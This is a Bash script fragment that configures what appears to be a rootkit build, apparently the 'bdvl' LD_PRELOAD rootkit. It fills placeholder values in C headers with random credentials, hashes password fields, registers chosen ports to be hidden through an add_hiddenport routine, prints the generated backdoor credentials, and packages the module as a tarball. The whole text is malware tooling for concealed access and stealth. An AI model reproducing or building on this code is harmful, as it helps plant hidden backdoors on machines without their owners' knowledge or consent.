find_var_placeholders(){
    local headers current_var \
          header_path header_vars \
          vars

    headers=(`find_header_paths`)

    for w in ${headers[@]}; do
        header_path=$w
        header_vars=("`cat $header_path | grep '??'`")

        for var in ${header_vars[@]}; do
            current_var=`echo $var | grep "??"`
            [ -z $current_var ] && continue
            vars+=($current_var)
        done
    done

    echo -n "${vars[*]}"
}

get_setting(){ # $1 = var
    local var name \
          input is_string
    var="$1"

    # standard lengths for variable values.
    # values are randomly generated unless a value
    # is otherwise specified at runtime.
    local default_strlen=8
    local default_intlen=4

    [[ $var == *"\""* ]] && is_string=1 || is_string=0
    #[[ $var != *"\""* ]] && is_string=0

    [ $is_string == 1 ] && input="`random 'a-z' $default_strlen`"
    [ $is_string == 0 ] && input=`random '1-9' $default_intlen`

    eval "name=\"`printf ${var} | tr -d '\"\?,'`\""
    # this check here determines whether or not there is already
    # a value available for $input to use. (set at runtime or
    # predefined in one of the scripts)
    [ ! -z "`printf "${!name}"`" ] && input="${!name}"
    echo "$name = $input" >> $BDVLSO.creds

    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$name" == *"_PWD" ]] && \
        input="`crypt_password $input`" # if the variable is intended to be a password,
                                        # make sure it's hashed before writing it anywhere

    [ $is_string == 1 ] && input="\"$input\""

    echo -n "$input:$var"
}

output_creds(){
    [ ! -f $BDVLSO.creds ] && return
    [ $USE_DIALOG == 0 ] && { echo; while read -r line; do necho "$line"; done <<< "`cat $BDVLSO.creds`"; echo; }
    [ $USE_DIALOG == 1 ] && show_file $BDVLSO.creds
    rm $BDVLSO.creds
}

# every time we overwrite a placeholder, we find all
# of the header paths for every placeholder. i could just call
# `find_header_paths` once previously, but here we are.
overwrite_placeholder(){ # $1 = element of configuration (NEW_VALUE:PLACEHOLDER)
    local headers=(`find_header_paths`)
    IFS=':' read -r var_value var_name <<< "$1"
    for header in ${headers[@]}; do sed -i "s:${var_name}:${var_value}:" $header; done
}

setup_header(){ # $1 = header to write to
    necho "Building & writing C char arrays for the lib headers"
    write_char_arrays >> $1

    necho "Writing background variables"
    write_consts >> $1
}

populate_new_placeholders(){
    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }

    setup_header $BDVL_H

    local var_placeholders settings index

    necho "Getting variable placeholders and their new values"
    var_placeholders=(`find_var_placeholders`)
    for i in ${!var_placeholders[@]}; do
        local current_var="${var_placeholders[$i]}"
        settings+=(`get_setting "$current_var"`)

        # if the current setting is that of a port to hide,
        # add it to our array of hidden ports so that we can
        # write it to the 'hide_ports' file.
        [ `toggle_enabled HIDE_PORTS` == "false" ] && continue  # don't if we don't need to
        IFS=':' read -r curvar_val curvar_name <<< "${settings[$i]}"
        [[ "$curvar_name" == *"PORT"* ]] && \
            add_hiddenport $curvar_name $curvar_val
    done

    output_creds

    necho "Overwriting old variable placeholders with new settings"
    for selem in ${settings[@]}; do overwrite_placeholder "$selem"; done

    if [ $DOCOMPRESS == 1 ]; then
        [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
        echo; secho "Beginning compression of $NEW_MDIR"
        verbose "Writing environment settings to $NEW_MDIR/settings"
        write_defaults $NEW_MDIR/settings

        local tarname="$NEW_MDIR.tar.gz"
        #echo; necho "Now compressing $NEW_MDIR, with gzip"
        verbose "tarball name = $tarname"
        sleep 1
        tar cpfz $tarname $NEW_MDIR && \
            secho "Finished compressing successfully" || \
            eecho "Failure trying to compress with tar (gzip)"
    fi
}